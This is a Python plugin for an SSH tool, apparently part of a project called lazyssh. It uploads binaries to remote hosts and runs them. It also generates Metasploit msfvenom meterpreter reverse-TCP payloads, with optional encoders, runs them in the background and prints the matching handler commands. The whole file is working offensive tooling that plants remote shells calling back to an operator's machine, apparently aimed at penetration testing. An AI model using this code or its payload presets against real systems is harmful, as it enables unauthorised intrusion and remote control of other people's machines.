#!/usr/bin/env python3
# PLUGIN_NAME: upload-exec
# PLUGIN_DESCRIPTION: Upload and execute binaries on remote hosts with msfvenom support
# PLUGIN_VERSION: 1.0.0
# PLUGIN_REQUIREMENTS: python3

"""Upload and execute binaries on remote hosts.

Supports uploading local binaries, generating msfvenom payloads for the
detected remote architecture, and executing them via the SSH control socket.
All operations are driven by CLI arguments passed from the plugin runner.
"""

from __future__ import annotations

import argparse
import os
import shlex
import shutil
import subprocess
import sys
import tempfile
from dataclasses import dataclass

from lazyssh.console_instance import console

try:  # pragma: no cover - logging may be unavailable when packaged separately
    from lazyssh.logging_module import APP_LOGGER
except Exception:  # pragma: no cover
    APP_LOGGER = None  # type: ignore[assignment]

from lazyssh.plugins._arch_detection import RemoteArch, detect_remote_arch

# ---------------------------------------------------------------------------
# Msfvenom integration
# ---------------------------------------------------------------------------

PAYLOAD_PRESETS: dict[str, str] = {
    "x64": "linux/x64/meterpreter/reverse_tcp",
    "x86": "linux/x86/meterpreter/reverse_tcp",
    "aarch64": "linux/aarch64/meterpreter/reverse_tcp",
    "armle": "linux/armle/meterpreter/reverse_tcp",
}


@dataclass
class MsfvenomConfig:
    """Configuration for msfvenom payload generation."""

    payload: str
    lhost: str
    lport: int
    format: str  # "elf", "raw", "py", "sh"
    encoder: str | None = None
    iterations: int = 1


def generate_msfvenom_payload(config: MsfvenomConfig, output_path: str) -> bool:
    """Generate payload using msfvenom. Returns success."""
    cmd = [
        "msfvenom",
        "-p",
        config.payload,
        f"LHOST={config.lhost}",
        f"LPORT={config.lport}",
        "-f",
        config.format,
        "-o",
        output_path,
    ]
    if config.encoder:
        cmd.extend(["-e", config.encoder, "-i", str(config.iterations)])

    console.print(f"[dim]Generating payload: {' '.join(cmd)}[/dim]")

    try:
        result = subprocess.run(  # noqa: S603,S607
            cmd,
            capture_output=True,
            text=True,
            timeout=120,
        )
        if result.returncode != 0:
            console.print(f"[error]msfvenom failed: {result.stderr.strip()}[/error]")
            return False
        console.print(f"[success]Payload generated: {output_path}[/success]")
        return True
    except subprocess.TimeoutExpired:
        console.print("[error]msfvenom timed out[/error]")
        return False
    except FileNotFoundError:
        console.print("[error]msfvenom not found — is Metasploit installed?[/error]")
        return False


def get_handler_command(config: MsfvenomConfig) -> str:
    """Return msfconsole handler setup commands."""
    return (
        f"use exploit/multi/handler\n"
        f"set payload {config.payload}\n"
        f"set LHOST {config.lhost}\n"
        f"set LPORT {config.lport}\n"
        f"run"
    )


# ---------------------------------------------------------------------------
# SCP upload
# ---------------------------------------------------------------------------


def _scp_upload(local_path: str, remote_path: str) -> bool:
    """Upload file via SCP over control socket."""
    socket_path = os.environ.get("LAZYSSH_SOCKET_PATH", "")
    host = os.environ.get("LAZYSSH_HOST", "")
    user = os.environ.get("LAZYSSH_USER", "")
    port = os.environ.get("LAZYSSH_PORT")

    if not socket_path or not host or not user:
        console.print("[error]Missing SSH environment variables for SCP upload[/error]")
        return False

    cmd = ["scp", "-q", "-o", f"ControlPath={socket_path}"]
    if port:
        cmd.extend(["-P", port])
    cmd.extend([local_path, f"{user}@{host}:{remote_path}"])

    try:
        result = subprocess.run(  # noqa: S603,S607
            cmd,
            capture_output=True,
            text=True,
            timeout=120,
        )
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        console.print("[error]SCP upload timed out[/error]")
        return False


# ---------------------------------------------------------------------------
# SSH exec helper
# ---------------------------------------------------------------------------


def _ssh_exec(command: str, timeout: int = 300) -> tuple[int, str, str]:
    """Execute command on remote host via SSH control socket.

    Returns (exit_code, stdout, stderr).
    """
    socket_path = os.environ.get("LAZYSSH_SOCKET_PATH", "")
    host = os.environ.get("LAZYSSH_HOST", "")
    user = os.environ.get("LAZYSSH_USER", "")
    port = os.environ.get("LAZYSSH_PORT")

    if not socket_path or not host or not user:
        return 1, "", "Missing SSH environment variables"

    ssh_cmd: list[str] = ["ssh", "-S", socket_path, "-o", "ControlMaster=no"]
    if port:
        ssh_cmd.extend(["-p", port])
    ssh_cmd.append(f"{user}@{host}")
    ssh_cmd.extend(["sh", "-c", shlex.quote(command)])

    try:
        result = subprocess.run(  # noqa: S603,S607
            ssh_cmd,
            text=True,
            capture_output=True,
            timeout=timeout,
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return 1, "", "Command timed out"


# ---------------------------------------------------------------------------
# Core upload-and-execute flow
# ---------------------------------------------------------------------------


def _create_staging_dir() -> tuple[bool, str]:
    """Create remote staging directory. Returns (success, path)."""
    staging = "/tmp/.lazyssh_exec"
    exit_code, _, stderr = _ssh_exec(f"mkdir -p {staging} && chmod 700 {staging}")
    if exit_code != 0:
        console.print(f"[error]Failed to create staging dir: {stderr}[/error]")
        return False, ""
    return True, staging


def upload_and_execute(
    local_path: str,
    *,
    remote_args: str = "",
    no_cleanup: bool = False,
    background: bool = False,
    timeout: int = 300,
    output_file: str | None = None,
    dry_run: bool = False,
) -> int:
    """Upload a local file to the remote host and execute it.

    Returns 0 on success, non-zero on failure.
    """
    if not os.path.isfile(local_path):
        console.print(f"[error]File not found: {local_path}[/error]")
        return 1

    filename = os.path.basename(local_path)

    if dry_run:
        console.print("[bold yellow]DRY-RUN mode — no changes will be made[/bold yellow]\n")
        console.print(f"  Would upload: {local_path}")
        console.print(f"  Remote path:  /tmp/.lazyssh_exec/{filename}")
        console.print(f"  Execute with: ./{filename} {remote_args}".rstrip())
        console.print(f"  Cleanup:      {'no' if no_cleanup else 'yes'}")
        console.print(f"  Background:   {'yes' if background else 'no'}")
        return 0

    # Create staging directory
    ok, staging = _create_staging_dir()
    if not ok:
        return 1

    remote_path = f"{staging}/{filename}"

    # Upload
    console.print(f"[info]Uploading {filename} to {remote_path}...[/info]")
    if not _scp_upload(local_path, remote_path):
        console.print("[error]Upload failed[/error]")
        return 1
    console.print("[success]Upload complete[/success]")

    # chmod +x
    exit_code, _, stderr = _ssh_exec(f"chmod +x {shlex.quote(remote_path)}")
    if exit_code != 0:
        console.print(f"[error]chmod failed: {stderr}[/error]")
        return 1

    # Execute
    exec_cmd = shlex.quote(remote_path)
    if remote_args:
        exec_cmd = f"{exec_cmd} {remote_args}"
    if background:
        exec_cmd = f"nohup {exec_cmd} > /dev/null 2>&1 &"

    console.print(f"[info]Executing: {exec_cmd}[/info]")
    exit_code, stdout, stderr = _ssh_exec(exec_cmd, timeout=timeout)

    if stdout:
        if output_file:
            with open(output_file, "w") as f:
                f.write(stdout)
            console.print(f"[success]Output saved to {output_file}[/success]")
        else:
            console.print(stdout.rstrip())

    if stderr:
        console.print(f"[dim]{stderr.rstrip()}[/dim]")

    if exit_code != 0 and not background:
        console.print(f"[warning]Remote execution exited with code {exit_code}[/warning]")

    # Cleanup
    if not no_cleanup and not background:
        console.print("[dim]Cleaning up remote files...[/dim]")
        _ssh_exec(f"rm -rf {shlex.quote(staging)}")

    return exit_code if not background else 0


# ---------------------------------------------------------------------------
# Msfvenom mode
# ---------------------------------------------------------------------------


def msfvenom_mode(
    arch: RemoteArch,
    *,
    payload: str | None = None,
    lhost: str | None = None,
    lport: int = 4444,
    encoder: str | None = None,
    iterations: int = 1,
    fmt: str = "elf",
    no_cleanup: bool = False,
    background: bool = False,
    timeout: int = 300,
    output_file: str | None = None,
    dry_run: bool = False,
) -> int:
    """Generate msfvenom payload and upload/execute it."""
    if not shutil.which("msfvenom"):
        console.print("[error]msfvenom not found in PATH — install Metasploit first[/error]")
        return 1

    # Determine payload
    selected_payload = payload or PAYLOAD_PRESETS.get(arch.msf_arch)
    if not selected_payload:
        console.print(
            f"[error]No preset payload for architecture {arch.msf_arch}. "
            f"Use --payload to specify one.[/error]"
        )
        return 1

    if not lhost:
        console.print("[error]LHOST is required for msfvenom payloads. Use --lhost.[/error]")
        return 1

    config = MsfvenomConfig(
        payload=selected_payload,
        lhost=lhost,
        lport=lport,
        format=fmt,
        encoder=encoder,
        iterations=iterations,
    )

    if dry_run:
        console.print("[bold yellow]DRY-RUN mode — no changes will be made[/bold yellow]\n")
        console.print(f"  Payload:  {config.payload}")
        console.print(f"  LHOST:    {config.lhost}")
        console.print(f"  LPORT:    {config.lport}")
        console.print(f"  Format:   {config.format}")
        if config.encoder:
            console.print(f"  Encoder:  {config.encoder} (x{config.iterations})")
        console.print(f"\n[dim]Handler command:\n{get_handler_command(config)}[/dim]")
        return 0

    # Generate payload to temp file
    with tempfile.NamedTemporaryFile(suffix=f".{fmt}", delete=False) as tmp:
        tmp_path = tmp.name

    try:
        if not generate_msfvenom_payload(config, tmp_path):
            return 1

        # Display handler command
        console.print("\n[panel.title]Start your handler:[/panel.title]")
        console.print(f"[accent]{get_handler_command(config)}[/accent]\n")

        # Upload and execute
        return upload_and_execute(
            tmp_path,
            no_cleanup=no_cleanup,
            background=background,
            timeout=timeout,
            output_file=output_file,
        )
    finally:
        # Clean up local temp payload
        if os.path.exists(tmp_path):
            os.unlink(tmp_path)


# ---------------------------------------------------------------------------
# Usage display (non-interactive)
# ---------------------------------------------------------------------------


def _show_usage(arch: RemoteArch) -> int:
    """Print usage information with detected remote architecture."""
    console.print("\n[panel.title]Upload & Execute Plugin[/panel.title]")
    console.print(f"  Remote arch: {arch.raw_arch} ({arch.msf_arch})")
    console.print(f"  Remote OS:   {arch.raw_os} ({arch.msf_platform})\n")

    console.print("[bold]Usage:[/bold]  plugin run upload-exec <socket> [options]\n")

    console.print("[header]Upload & Execute a Local Binary:[/header]")
    console.print("  plugin run upload-exec myserver /path/to/binary")
    console.print("  plugin run upload-exec myserver /path/to/binary --args '--flag value'")
    console.print("  plugin run upload-exec myserver /path/to/binary --background")
    console.print("  plugin run upload-exec myserver /path/to/binary --no-cleanup")
    console.print("  plugin run upload-exec myserver /path/to/binary --timeout 60")
    console.print("  plugin run upload-exec myserver /path/to/binary --output-file out.txt")
    console.print("  plugin run upload-exec myserver /path/to/binary --dry-run\n")

    console.print("[header]Generate & Upload msfvenom Payload:[/header]")
    console.print("  plugin run upload-exec myserver --msfvenom --lhost 10.0.0.1")
    console.print("  plugin run upload-exec myserver --msfvenom --lhost 10.0.0.1 --lport 5555")
    console.print(
        "  plugin run upload-exec myserver --msfvenom --lhost 10.0.0.1"
        " --payload linux/x64/shell_reverse_tcp"
    )
    console.print(
        "  plugin run upload-exec myserver --msfvenom --lhost 10.0.0.1"
        " --encoder x86/shikata_ga_nai --iterations 3"
    )
    console.print(
        "  plugin run upload-exec myserver --msfvenom --lhost 10.0.0.1 --background --dry-run\n"
    )

    console.print("[header]Options:[/header]")
    console.print("  --args TEXT          Arguments for remote binary")
    console.print("  --no-cleanup         Keep file on remote after execution")
    console.print("  --background         Execute in background (nohup)")
    console.print("  --timeout SECS       Execution timeout (default: 300)")
    console.print("  --output-file PATH   Save remote output to local file")
    console.print("  --msfvenom           Generate msfvenom payload instead of uploading a file")
    console.print("  --payload TEXT       Override msfvenom payload string")
    console.print("  --lhost IP           LHOST for msfvenom (required with --msfvenom)")
    console.print("  --lport PORT         LPORT for msfvenom (default: 4444)")
    console.print("  --encoder TEXT       Msfvenom encoder")
    console.print("  --iterations N       Encoder iterations (default: 1)")
    console.print("  --format FMT         Output format: elf, raw, py, sh (default: elf)")
    console.print("  --dry-run            Show plan without executing\n")

    return 0


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------


def build_parser() -> argparse.ArgumentParser:
    """Build the argument parser for upload-exec."""
    parser = argparse.ArgumentParser(
        prog="upload-exec",
        description="Upload and execute binaries on remote hosts with msfvenom support",
    )
    parser.add_argument("file_path", nargs="?", default=None, help="Local file to upload")
    parser.add_argument(
        "--args", dest="remote_args", default="", help="Arguments for remote binary"
    )
    parser.add_argument(
        "--no-cleanup", action="store_true", help="Don't delete file after execution"
    )
    parser.add_argument("--background", action="store_true", help="Execute in background (nohup)")
    parser.add_argument(
        "--timeout", type=int, default=300, help="Execution timeout in seconds (default: 300)"
    )
    parser.add_argument("--output-file", default=None, help="Save remote output to local file")

    # Msfvenom options
    parser.add_argument("--msfvenom", action="store_true", help="Generate msfvenom payload")
    parser.add_argument("--payload", default=None, help="Override msfvenom payload")
    parser.add_argument("--lhost", default=None, help="LHOST for msfvenom")
    parser.add_argument(
        "--lport", type=int, default=4444, help="LPORT for msfvenom (default: 4444)"
    )
    parser.add_argument("--encoder", default=None, help="Msfvenom encoder")
    parser.add_argument("--iterations", type=int, default=1, help="Encoder iterations (default: 1)")
    parser.add_argument(
        "--format",
        dest="fmt",
        default="elf",
        choices=["elf", "raw", "py", "sh"],
        help="Output format (default: elf)",
    )
    parser.add_argument("--dry-run", action="store_true", help="Show plan without executing")

    return parser


def main() -> int:  # pragma: no cover - CLI entry point
    parser = build_parser()
    args = parser.parse_args()

    # Detect remote architecture
    try:
        arch = detect_remote_arch()
    except RuntimeError as exc:
        console.print(f"[error]Architecture detection failed: {exc}[/error]")
        return 1

    # No arguments at all → show usage with detected architecture
    if args.file_path is None and not args.msfvenom:
        return _show_usage(arch)

    # Msfvenom mode
    if args.msfvenom:
        return msfvenom_mode(
            arch,
            payload=args.payload,
            lhost=args.lhost,
            lport=args.lport,
            encoder=args.encoder,
            iterations=args.iterations,
            fmt=args.fmt,
            no_cleanup=args.no_cleanup,
            background=args.background,
            timeout=args.timeout,
            output_file=args.output_file,
            dry_run=args.dry_run,
        )

    # Upload-and-execute mode
    return upload_and_execute(
        args.file_path,
        remote_args=args.remote_args,
        no_cleanup=args.no_cleanup,
        background=args.background,
        timeout=args.timeout,
        output_file=args.output_file,
        dry_run=args.dry_run,
    )


if __name__ == "__main__":  # pragma: no cover - CLI entry point
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\nInterrupted by user", file=sys.stderr)
        sys.exit(130)
